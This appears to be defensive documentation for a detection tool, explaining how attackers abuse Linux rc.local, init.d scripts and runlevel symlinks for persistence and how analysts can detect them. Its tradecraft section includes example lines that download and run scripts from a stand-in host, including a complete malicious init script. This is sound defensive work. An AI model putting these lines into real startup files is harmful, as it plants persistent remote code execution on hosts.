# RC / Init Persistence

## Overview

RC and init-based persistence refers to the abuse of legacy Linux initialization mechanisms to obtain code execution during system startup or runlevel transitions.

Before `systemd` became the dominant init system across modern Linux distributions, many Unix-like systems relied on:

- `/etc/init.d/`
- `/etc/rc.local`
- `/etc/rc*.d/`

These paths still exist on many systems for compatibility, administrative convenience, or because the distribution continues to support SysV-style initialization.

Because these mechanisms are tied to boot-time execution, they can provide highly reliable persistence.

> **RC/init persistence works by embedding malicious execution into the operating system’s startup sequence.**

Even on systems where `systemd` is present, legacy init surfaces may still be honored directly, wrapped for compatibility, or referenced operationally by administrators. That means analysts cannot dismiss them as “old” without first verifying whether they are active on the host.

---

## Why Attackers Use RC / Init for Persistence

Attackers use RC/init mechanisms because they provide:

- Boot-time execution  
- High survivability across reboots  
- Privileged execution potential  
- Familiar administrative-looking file paths  
- A persistence surface that is often overlooked on modern systems  

Compared with `cron`, RC/init persistence is generally less frequent but more strategically reliable: instead of recurring on a timer, it re-establishes execution when the host restarts.

Compared with `systemd`, it may be:
- less structured
- less monitored
- more likely to blend into older or mixed-administration environments

---

## Execution Semantics

RC/init persistence depends on how the host manages startup behavior.

Common paths include:

- `/etc/rc.local`
- `/etc/init.d/`
- `/etc/rc0.d/`
- `/etc/rc1.d/`
- `/etc/rc2.d/`
- `/etc/rc3.d/`
- `/etc/rc4.d/`
- `/etc/rc5.d/`
- `/etc/rc6.d/`
- `/etc/rcS.d/`

### Core Concepts

#### `/etc/init.d/`
Contains service scripts used by SysV-style initialization. These scripts can be:
- invoked directly
- referenced by symlinks in runlevel directories
- wrapped or managed by compatibility layers

#### `/etc/rc*.d/`
Runlevel directories typically contain symlinks that point back to scripts in `/etc/init.d/`.

Examples:
- `S20ssh`
- `K10networking`

Naming convention often indicates:
- `S` = start
- `K` = kill/stop
- number = execution order

#### `/etc/rc.local`
Historically used as a local startup script for commands executed late in the boot process. On some systems it is absent, disabled, or only honored if explicitly enabled.

---

## Privilege Requirements

System-level RC/init persistence typically requires root because these locations are privileged.

That means attackers usually abuse these surfaces:

- after privilege escalation
- during post-exploitation
- after obtaining administrative access

This is important analytically:

> RC/init persistence is usually not an initial foothold mechanism. It is a persistence mechanism used once the attacker is already strong enough to survive reboot.

---

## Why This Mechanism Is So Powerful

RC/init persistence is powerful because it aligns with a fundamental system event:

- the host starts
- startup routines execute
- services and local scripts run

This gives attackers a natural opportunity to:
- re-establish access
- launch payloads
- stage second phases
- re-enable other persistence methods

The system itself becomes the execution trigger.

Unlike shell-based persistence, it does not depend on a user logging in.  
Unlike cron, it does not need repeated scheduling.  
Unlike SSH key persistence, it is not merely access-oriented.

It is direct startup-time execution.

---

## Common Attacker Tradecraft

### 1. Backdooring `/etc/rc.local`

Target file:

```text
/etc/rc.local
```

Example modification:

```text
/bin/bash -c "curl http://evil.test/payload.sh | bash" &
```

Execution flow:
1. Attacker gains root access  
2. Appends malicious line to `/etc/rc.local`  
3. Host reboots  
4. RC local script executes near the end of boot  
5. Payload is fetched and executed automatically  

Why attackers use this:
- Very simple to deploy  
- High boot reliability on systems that honor `rc.local`  
- Minimal structural complexity  

---

### 2. Dropping a Malicious Init Script in `/etc/init.d/`

Target file:

```text
/etc/init.d/dbus-update
```

Example script body:

```sh
#!/bin/sh
### BEGIN INIT INFO
# Provides:          dbus-update
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO

/bin/bash -c "wget http://evil.test/a.sh -O- | sh"
```

Execution flow:
1. Attacker writes malicious script to `/etc/init.d/`  
2. Script is made executable  
3. Runlevel links are created or service is registered  
4. Script executes during normal boot sequence  
5. Malicious payload is staged or executed  

Why attackers use this:
- Looks like a legitimate service script  
- Fits older administrative patterns  
- Can be linked into multiple runlevels  

---

### 3. Creating Runlevel Symlinks in `/etc/rc*.d/`

Target path:

```text
/etc/rc2.d/S99dbus-update
```

Symlink target:

```text
/etc/init.d/dbus-update
```

Execution flow:
1. Attacker places malicious init script in `/etc/init.d/`  
2. Creates start symlink in a runlevel directory  
3. On entering that runlevel, system executes the script  
4. Malicious logic runs as part of the startup order  

Why attackers use this:
- More complete than dropping a script alone  
- Ensures runlevel-triggered execution  
- Blends with normal SysV startup flow  

---

### 4. Masquerading as a Legitimate Service Script

Target file:

```text
/etc/init.d/network-update
```

Example malicious line:

```text
nohup /tmp/.cache/netmon >/dev/null 2>&1 &
```

Execution flow:
1. Attacker names script to resemble system maintenance or networking  
2. Startup script is placed where admins expect to see services  
3. Host boots and script runs  
4. Payload is launched in background  

Why attackers use this:
- Naming reduces suspicion  
- Background execution reduces visible impact  
- Looks plausible in mixed or legacy environments  

---

### 5. Launching Payloads from Temporary Paths

Target file:

```text
/etc/rc.local
```

Example line:

```text
/tmp/run.sh
```

Execution flow:
1. Attacker stages payload in temporary directory  
2. RC/init file references temporary script  
3. System boots  
4. Script executes with startup privileges  

Why attackers use this:
- Fast deployment  
- Easy payload replacement  
- Keeps main persistence artifact small  

Why analysts care:
- Persistent boot execution referencing `/tmp`, `/var/tmp`, or `/dev/shm` is highly suspicious

---

### 6. Network-Based Execution from Init Context

Target file:

```text
/etc/init.d/backupd
```

Example line:

```text
curl http://evil.test/bootstrap.sh | bash
```

Execution flow:
1. Attacker modifies or creates init script  
2. Script runs during startup  
3. Host reaches network availability  
4. Remote payload is fetched and executed  

Why attackers use this:
- No permanent second-stage payload needed  
- Payload can be rotated remotely  
- Lower static artifact footprint  

---

### 7. Chained Persistence Through RC / Init

Example chain:
- `/etc/rc.local` launches `/tmp/stage.sh`
- `stage.sh` recreates cron persistence
- `stage.sh` reinstalls SSH key
- `stage.sh` restores deleted service or preload hook

Execution flow:
1. Host boots  
2. RC/init persistence executes first  
3. Secondary persistence mechanisms are restored  
4. Attacker regains layered resilience  

Why attackers use this:
- Startup persistence becomes the recovery mechanism  
- Survives partial remediation  
- Forces analysts to remove all linked footholds  

---

### 8. Replacing or Backdooring Existing Init Scripts

Target file:

```text
/etc/init.d/ssh
```

Example addition:

```text
/bin/bash -c "/usr/local/bin/.helper &"
```

Execution flow:
1. Attacker modifies existing trusted init script  
2. Service still appears to function normally  
3. Additional malicious logic executes at startup  
4. Persistence hides inside expected boot behavior  

Why attackers use this:
- Lower visibility than adding a brand new script  
- Trusted service name reduces suspicion  
- Operational continuity is preserved  

---

## What Normal Looks Like

Legitimate RC/init usage usually involves:

- standard package-managed service scripts  
- expected symlink names in runlevel directories  
- startup logic referencing trusted binaries in:
  - `/usr/bin/`
  - `/usr/sbin/`
  - `/bin/`
  - `/sbin/`
- descriptive service purpose consistent with host role  

Examples of normal behavior:

```text
/etc/init.d/ssh
/etc/rc2.d/S01rsyslog
/etc/rc.local containing documented local startup commands
```

Normal init scripts generally:
- are readable
- follow expected header conventions
- do not fetch remote content
- do not execute from temporary directories

---

## What Malicious Use Looks Like

### High-Signal Indicators

- References to:
  - `/tmp`
  - `/var/tmp`
  - `/dev/shm`
- Inline execution using:
  - `curl`
  - `wget`
  - `bash -c`
  - `sh -c`
- Unknown or suspicious script names
- Newly created scripts in `/etc/init.d/`
- Hidden or odd-named helper binaries launched from init context
- Runlevel symlinks pointing to suspicious targets

### Medium-Signal Indicators

- Existing init scripts modified recently  
- Background execution via `nohup`, `setsid`, or shell redirection  
- Generic names like:
  - `update`
  - `backup`
  - `network-update`
  - `dbus-update`

### Low-Signal Indicators

- legitimate local admin scripts
- compatibility scripts on older systems
- vendor-added initialization logic

---

## ATT&CK Mapping

The strongest ATT&CK relationship for this category is:

- **T1037.004 – Boot or Logon Initialization Scripts: RC Scripts**

This technique covers adversary abuse of RC scripts as boot-triggered persistence. ([MITRE ATT&CK])

Depending on implementation, RC/init abuse may also overlap with:

- startup execution
- service modification
- persistence after privilege escalation

---

## Why Analysts Miss This Technique

### 1. It Feels “Legacy”

Analysts sometimes assume RC/init is irrelevant because `systemd` is now dominant.

That assumption is dangerous.

### 2. The Paths Look Administrative

`/etc/init.d/` and `/etc/rc.local` look like ordinary system administration surfaces.

### 3. Compatibility Layers Obscure Usage

Even when `systemd` is in use, older init scripts may still exist and still matter operationally.

### 4. Analysts Focus More on Services Than Scripts

Some responders inspect `systemctl` output but do not inspect:
- `rc.local`
- runlevel symlinks
- SysV service script bodies

---

## Deep Analytical Guidance

### Key Question

> Is the system’s startup path executing code that does not belong there?

That is the right question.

The wrong question is:

> Does this file exist?

Many RC/init files exist legitimately. The issue is:
- what they execute
- where that execution points
- whether it aligns with system purpose

---

### Focus Areas

#### 1. Execution Target

What does the script actually launch?

Ask:
- Is it a standard system binary?
- Is it a script in a trusted path?
- Is it user-writable?
- Is it ephemeral?

#### 2. Registration Mechanism

How does the script get invoked?

- directly via `rc.local`
- via runlevel symlink
- via compatibility wrapper
- through service registration tooling

#### 3. Startup Timing

When in boot does it run?
- early?
- after networking?
- late local initialization?

This matters because payload behavior often depends on network availability.

#### 4. Script Provenance

Is it:
- package-managed
- documented
- expected for host role
- recently modified
- owned appropriately

#### 5. Chaining Behavior

Does the startup logic:
- fetch a remote payload
- recreate deleted persistence
- spawn background helpers
- modify other persistence surfaces

---

## Triage Workflow

1. Inspect RC/local and init paths:

```text
cat /etc/rc.local
ls -l /etc/init.d/
ls -l /etc/rc*.d/
```

2. Identify suspicious symlinks and script names  

3. Inspect script contents for:
- remote fetches
- temp path execution
- shell chaining
- background launch behavior

4. Validate metadata:

```text
stat /etc/rc.local
stat /etc/init.d/*
stat /etc/rc*.d/*
```

5. Determine whether scripts are package-managed if possible  

6. Correlate with:
- boot logs
- process execution
- network activity shortly after startup

---

## Evidence to Preserve

- `/etc/rc.local`
- `/etc/init.d/*`
- `/etc/rc*.d/*`
- referenced scripts and binaries
- symlink targets
- file metadata (timestamps, ownership, permissions)
- package ownership information if available
- network telemetry associated with boot-time execution

---

## False Positive Reduction

RC/init environments vary across distributions and host roles, so analysts should reduce false positives by asking:

- Is this mechanism still active on this host?
- Does the script belong to a known package or admin workflow?
- Does the host role justify this startup action?
- Is the naming consistent with the environment?
- Are the referenced paths trusted?

A local startup command is not automatically malicious.  
A local startup command that launches `/tmp/run.sh` is a very different matter.

---

## Why Tenax Checks This Surface

Tenax checks RC/init persistence because it remains:

- operationally relevant
- highly reliable at boot
- under-inspected by many analysts
- useful for restoring other persistence mechanisms

This category is especially valuable in:
- older fleets
- mixed-init environments
- post-exploitation scenarios where the attacker already has root

> RC/init persistence survives because many defenders stop at modern service management and forget the legacy startup path still exists.

---

## Key Takeaway

RC/init persistence is startup-time execution hidden inside system initialization behavior.

The attacker does not need to invent a new trigger.

> They simply insert themselves into the path the operating system already takes when it comes to life.
